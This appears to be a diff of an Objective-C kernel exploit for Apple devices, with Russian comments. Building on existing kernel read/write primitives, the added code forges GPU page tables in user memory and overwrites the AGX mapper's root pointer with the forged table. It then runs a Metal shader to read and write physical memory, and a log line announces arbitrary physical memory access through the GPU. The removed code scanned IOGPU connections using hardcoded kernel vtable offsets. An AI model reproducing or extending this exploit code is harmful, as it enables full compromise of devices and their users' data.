@@ -5369,9 +5369,10 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
                ftMapper, ftL1arr, ftL2, ftL3]);
 
 
-    // 5. Ищем mapper, обслуживающий Metal-буфер: наш walk-коннект НЕ тот.
-    //    Все IOGPU-коннекты процесса (ipc-таблица) → их AGXShared → mapper по
-    //    magic 0xbee500010004 @ +0x18 → чей L3 содержит PTE нашего буфера.
+
+    // 5. FORGE v2: обе стороны шейдера — НАШИ forged VA (result-буфер не
+    //    трогается шейдером → его PTE не нужна). fakeL3[100]=readTarget,
+    //    fakeL3[104]=writeTarget, VA: 0x10000064000 / 0x10000068000.
     mach_port_t tp = mach_thread_self();
     uint64_t tva = [self rcResolveThreadKVA:tp];
     mach_port_deallocate(mach_task_self(), tp);
@@ -5384,66 +5385,81 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
     extern uint64_t vtophys(uint64_t, uint64_t);
 
-    // Metal-буфер (цель скана)
-    id<MTLDevice> gMtl = MTLCreateSystemDefaultDevice();
-    id<MTLBuffer> rbuf = gMtl ? [gMtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
-    if (!rbuf) { GNOTE( @"FAIL: rbuf"); gGartLive = NO; return r; }
-    memset(rbuf.contents, 0xAB, 0x4000);
-    uint64_t rVA = rbuf.gpuAddress;
-    uint64_t rPA = ttep ? vtophys(ttep, (uint64_t)rbuf.contents) : 0;
-    GNOTE( [NSString stringWithFormat:@"  rbuf VA=%#llx PA=%#llx", rVA, rPA]);
+    uint64_t livePTE = kp_rc_kread64(L3);
+    uint64_t attrs = livePTE & ~0xFFFFFFFFF000ULL;
 
-    // перечисление коннектов
-    uint64_t slideC = kconstant(base) - 0xfffffff007004000;
-    uint64_t vtMP = 0xfffffff007b03d68 + slideC;   // IOMachPort
-    uint64_t vtUC = 0xfffffff007b5ba08 + slideC;   // AGXDeviceUserClient
-    int found = 0;
-    for (uint32_t i = 1; i < 2048 && found < 8; i++) {
-        uint64_t eVA = kpRCIsTable + (uint64_t)sizeof_ipc_entry * i;
-        uint64_t oRaw = kp_rc_kread64(eVA + off_ipc_entry_ie_object);
-        uint64_t pVA = kp_untag_ptr(oRaw);
-        if (!(pVA > 0xffffff0000000000ULL && pVA < 0xffffffff00000000ULL)) continue;
-        uint64_t kobj = kp_untag_ptr(kp_rc_kread64(pVA + off_ipc_port_ip_kobject));
-        if (!kpLooksLikeKernelPointer(kobj)) continue;
-        uint64_t pa4 = kvtophys(kobj);
-        if (!pa4 || !kpPAIsManaged(pa4)) continue;
-        if (kp_untag_ptr(kp_rc_kread64(kobj)) != vtMP) continue;
-        uint64_t uc2 = kp_untag_ptr(kp_rc_kread64(kobj + 0x30));
-        if (!kpLooksLikeKernelPointer(uc2)) continue;
-        uint64_t pa5 = kvtophys(uc2);
-        if (!pa5 || !kpPAIsManaged(pa5)) continue;
-        if (kp_untag_ptr(kp_rc_kread64(uc2)) != vtUC) continue;
-        found++;
-        GNOTE( [NSString stringWithFormat:@"  conn#%d: port[%u] uc=%#llx", found, i, uc2]);
-        // AGXShared по uc+0x120
-        uint64_t agxShared = kp_untag_ptr(kp_rc_kread64(uc2 + 0x120));
-        kpNote(r, [NSString stringWithFormat:@"    AGXShared=%#llx", agxShared]);
-        // сначала сверим магик на ИЗВЕСТНОМ mapper'е из нашей цепочки (iouat+0x20)
-        uint64_t uat2 = kp_untag_ptr(kp_rc_kread64(kp_untag_ptr(kp_rc_kread64(accel + 0xd0)) + 0x288));
-        uint64_t uat3 = kp_untag_ptr(kp_rc_kread64(uat2 + 0x10));
-        uint64_t knownMapper = kp_untag_ptr(kp_rc_kread64(uat3 + 0x20));
-        kpNote(r, [NSString stringWithFormat:@"    известный mapper=%#llx magic[+0x18]=%#llx", knownMapper,
-                   kpLooksLikeKernelPointer(knownMapper) ? kp_rc_kread64(knownMapper + 0x18) : 0]);
-        // дампим ВСЕ цели полей AGXShared с их +0x18 — офлайн узнаю mapper
-        if (kpLooksLikeKernelPointer(agxShared) && kvtophys(agxShared) && kpPAIsManaged(kvtophys(agxShared))) {
-            for (uint32_t o = 0; o < 0x1d8; o += 8) {
-                uint64_t cand = kp_untag_ptr(kp_rc_kread64(agxShared + o));
-                if (!kpLooksLikeKernelPointer(cand)) continue;
-                uint64_t band = (cand >> 32) & 0xff;
-                if (!(band >= 0xdf && band <= 0xe8)) continue;
-                if (kpVAIsEL2Domain(cand)) continue;
-                uint64_t pc6 = kvtophys(cand);
-                if (!pc6 || !kpPAIsManaged(pc6)) continue;
-                uint64_t m18 = kp_rc_kread64(cand + 0x18);
-                uint64_t m30 = kp_rc_kread64(cand + 0x30);
-                kpNote(r, [NSString stringWithFormat:@"    shared+%#x → %#llx  [+0x18]=%#llx [+0x30]=%#llx", o, cand, m18, m30]);
-            }
+    vm_address_t base = 0;
+    if (vm_allocate(mach_task_self(), &base, 0x14000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
+        mlock((void *)base, 0x14000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
+    memset((void *)base, 0, 0x14000);
+    uint8_t *fakeL1 = (uint8_t *)base;
+    uint8_t *fakeL2 = (uint8_t *)base + 0x4000;
+    uint8_t *fakeL3 = (uint8_t *)base + 0x8000;
+    uint8_t *rdT = (uint8_t *)base + 0xC000;   // читаемая цель (сентинель)
+    uint8_t *wrT = (uint8_t *)base + 0x10000;  // куда GPU пишет
+    memset(rdT, 0x37, 0x4000);
+    uint64_t paL1 = vtophys(ttep, (uint64_t)fakeL1);
+    uint64_t paL2 = vtophys(ttep, (uint64_t)fakeL2);
+    uint64_t paL3 = vtophys(ttep, (uint64_t)fakeL3);
+    uint64_t paRd = vtophys(ttep, (uint64_t)rdT);
+    uint64_t paWr = vtophys(ttep, (uint64_t)wrT);
+    GNOTE( [NSString stringWithFormat:@"  phys: L1=%#llx L2=%#llx L3=%#llx rd=%#llx wr=%#llx", paL1, paL2, paL3, paRd, paWr]);
+    if (!paL1 || !paL2 || !paL3 || !paRd || !paWr) { GNOTE( @"FAIL: vtophys"); gGartLive = NO; return r; }
+
+    // полные копии реальных таблиц
+    kreadbuf(L1arr, fakeL1, 0x4000);
+    kreadbuf(L2, fakeL2, 0x4000);
+    kreadbuf(L3, fakeL3, 0x4000);
+    *(uint64_t *)(fakeL1 + 16 * 8) = (paL2 & 0xFFFFFFFFF000ULL) | 3;
+    *(uint64_t *)(fakeL2 + 0)     = (paL3 & 0xFFFFFFFFF000ULL) | 3;
+    *(uint64_t *)(fakeL3 + 100 * 8) = (paRd & 0xFFFFFFFFF000ULL) | attrs;
+    *(uint64_t *)(fakeL3 + 104 * 8) = (paWr & 0xFFFFFFFFF000ULL) | attrs;
+
+    __block uint64_t probe = 0;
+    @autoreleasepool {
+        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
+        id<MTLBuffer> rbuf = mtl ? [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared] : nil;
+        if (!rbuf) { GNOTE( @"FAIL: rbuf"); }
+        else {
+            uint64_t origRoot = kp_rc_kread64(mapper + 0x30);
+            uint64_t fakeRootKV = gPrimitives.phystokv(paL1);
+            GNOTE( [NSString stringWithFormat:@"  подмена root: %#llx → %#llx", origRoot, fakeRootKV]);
+            kp_rc_kwrite64(mapper + 0x30, fakeRootKV);
+            kp_rc_kread64(mapper + 0x30);
+            // map-триггер (rebind AGX MMU на наши таблицы)
+            id<MTLBuffer> poke = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
+            GNOTE( [NSString stringWithFormat:@"  map-триггер: %@", poke ? @"ok" : @"FAIL"]);
+            NSError *err = nil;
+            id<MTLLibrary> lib = [mtl newLibraryWithSource:
+                @"kernel void rd(device ulong *u [[buffer(0)]]) { device ulong *p=(device ulong*)0x10000064000; device ulong *o=(device ulong*)0x10000068000; *o=*p; }"
+                options:nil error:&err];
+            id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"rd"] : nil;
+            id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
+            id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
+            id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
+            id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
+            if (enc) {
+                [enc setComputePipelineState:pipe];
+                [enc setBuffer:rbuf offset:0 atIndex:0];
+                [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+                [enc endEncoding];
+                [cb commit];
+                [cb waitUntilCompleted];
+                probe = *(volatile uint64_t *)wrT;
+                GNOTE( [NSString stringWithFormat:@"  GPU: wrT[0]=%#llx (%@)", probe,
+                           probe == 0x3737373737373737ULL ? @"GART READ+WRITE РАБОТАЮТ — произвольная физпамять через GPU!" :
+                           probe ? @"что-то записалось (не сентинель)" : @"ноль — таблицы не наши/нет rebind"]);
+            } else GNOTE( [NSString stringWithFormat:@"  compute оборвался: %@", err]);
+            kp_rc_kwrite64(mapper + 0x30, origRoot);
+            GNOTE( [NSString stringWithFormat:@"  root восстановлен: %#llx", kp_rc_kread64(mapper + 0x30)]);
         }
     }
-    GNOTE( [NSString stringWithFormat:@"  IOGPU коннектов: %d", found]);
+    munlock((void *)base, 0x14000);
+    vm_deallocate(mach_task_self(), base, 0x14000);
     gGartLive = NO;
     return r;
 }
+
 
 
 #pragma mark - D1: TXM stack + frame-type recon (kread-only)
